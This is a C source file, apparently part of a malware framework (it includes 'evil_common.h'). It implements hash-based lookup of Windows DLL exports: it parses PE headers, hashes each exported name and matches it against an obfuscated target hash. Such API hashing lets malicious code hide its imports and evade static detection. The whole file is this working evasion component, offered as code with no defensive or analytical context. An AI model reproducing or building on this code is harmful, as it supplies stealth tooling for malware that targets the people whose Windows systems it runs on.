//@@@headers
#include "exp_by_hash.h"
#include "evil_common.h"
#include "../string_hashes.h"
#include <windows.h>
//@@@endheaders

//@@@privdefs
#define V_EXPBYH() ((EXPBYH_VARS*)SELF())
//@@@endprivdefs

_STRUCT(EXPBYH_VARS) {
  //@@@structfields /name EXPBYH_VARS
  PIMAGE_EXPORT_DIRECTORY ExpDir;
  PIMAGE_OPTIONAL_HEADER pOptHdr;
  PIMAGE_DOS_HEADER pDosHdr;
  PIMAGE_NT_HEADERS pNtHdrs; // rename!!!!!!!!!!!!!!!! all! make good names!
  DWORD ExpTblLen;
  DWORD ExpTblRva;
  DWORD* pNames;
  PUSHORT pOrds;
  PULONG pEntries;
  BOOL forwarded;
  UINT i;
  ULONG ExpTableLen;
  ULONG ExpTableEnd;
  DWORD CurRva;
  PVOID found_export;
  //@@@endstructfields
};

// --------------------------------------------

// see calchash.py
static SPRAYABLE_PROC(calchash_iterate) {
  //@@@proc /name calchash_iterate
  STK_TMPVAR1D = STRHASH_MULTIPLIER * CUR_RETD;
  CUR_RETD = STK_TMPVAR1D + *(char*)CUR_A1;
  //@@@endproc 
}

// CUR_A1 -> lpStrToHash
SPRAYABLE_PROC(calchash) {
  //@@@proc /name calchash
  CHILD_A1 = CUR_A1;
  CHILD_RET = 0;
  while (*(char*)CHILD_A1 != '\0') { _CALL(calchash_iterate); (*(char**)&CHILD_A1)++; }
  CUR_RETD = CHILD_RETD;
  //@@@endproc 
}

// ---

// CUR_A1 -> lpImage
static SPRAYABLE_PROC(exp_by_hash_found) {
  //@@@proc /name exp_by_hash_found
  V_EXPBYH()->ExpTableEnd = V_EXPBYH()->ExpTblRva + V_EXPBYH()->ExpTblLen;
  V_EXPBYH()->CurRva = V_EXPBYH()->pEntries[V_EXPBYH()->pOrds[V_EXPBYH()->i]]; // temp var
  V_EXPBYH()->forwarded = (V_EXPBYH()->CurRva >= V_EXPBYH()->ExpTblRva && V_EXPBYH()->pEntries[V_EXPBYH()->pOrds[V_EXPBYH()->i]] <= V_EXPBYH()->ExpTableEnd);
  V_EXPBYH()->found_export = (void*)((DWORD_PTR)CUR_A1 + V_EXPBYH()->CurRva); // it's returned by exp_by_hash
  V_EXPBYH()->i = V_EXPBYH()->ExpDir->NumberOfNames;                          // *** make loop exit ***
  //@@@endproc 
}

// CUR_A1 -> lpImage, CUR_A2D -> dwHashToFind
static SPRAYABLE_PROC(exp_by_hash_enumfn) {
  //@@@proc /name exp_by_hash_enumfn
  CHILD_A1 = (LPSTR)((DWORD_PTR)CUR_A1 + V_EXPBYH()->pNames[V_EXPBYH()->i]);
  _CALL(calchash);
  CHILD_A1 = CUR_A1; // exp_by_hash_found's lpImage
  if (CHILD_RETD == CUR_A2D) { _CALL(exp_by_hash_found); } else { V_EXPBYH()->i++; }
  //@@@endproc 
}

// CUR_A1 -> lpImage, CUR_A2 -> dwHashToFind (obf!), CUR_RETD -> export fn ptr
SPRAYABLE_PROC(exp_by_hash) {
  //@@@proc /name exp_by_hash
  PUSH_SELF(malloc(sizeof(EXPBYH_VARS)));
  V_EXPBYH()->pDosHdr = (PIMAGE_DOS_HEADER)((DWORD_PTR)CUR_A1);
  V_EXPBYH()->pNtHdrs = (PIMAGE_NT_HEADERS)((DWORD_PTR)CUR_A1 + V_EXPBYH()->pDosHdr->e_lfanew);
  V_EXPBYH()->pOptHdr = &V_EXPBYH()->pNtHdrs->OptionalHeader;
  V_EXPBYH()->ExpTblLen = V_EXPBYH()->pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  V_EXPBYH()->ExpTblRva = V_EXPBYH()->pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  V_EXPBYH()->ExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)CUR_A1 + V_EXPBYH()->ExpTblRva);
  V_EXPBYH()->pNames = (DWORD*)((DWORD_PTR)CUR_A1 + V_EXPBYH()->ExpDir->AddressOfNames);
  V_EXPBYH()->pOrds = (PUSHORT)((DWORD_PTR)CUR_A1 + V_EXPBYH()->ExpDir->AddressOfNameOrdinals);
  V_EXPBYH()->pEntries = (PULONG)((DWORD_PTR)CUR_A1 + V_EXPBYH()->ExpDir->AddressOfFunctions);
  V_EXPBYH()->forwarded = FALSE;
  V_EXPBYH()->i = 0;
  V_EXPBYH()->found_export = NULL;
  CHILD_A1 = CUR_A1;
  CHILD_A2D = ObfDecDw(CUR_A2D);
  // loop will break by exp_by_hash_hashequal
  while (V_EXPBYH()->i < V_EXPBYH()->ExpDir->NumberOfNames) { _CALL(exp_by_hash_enumfn); }
  CUR_RET = V_EXPBYH()->found_export;
  POP_SELF();
  //@@@endproc 
}



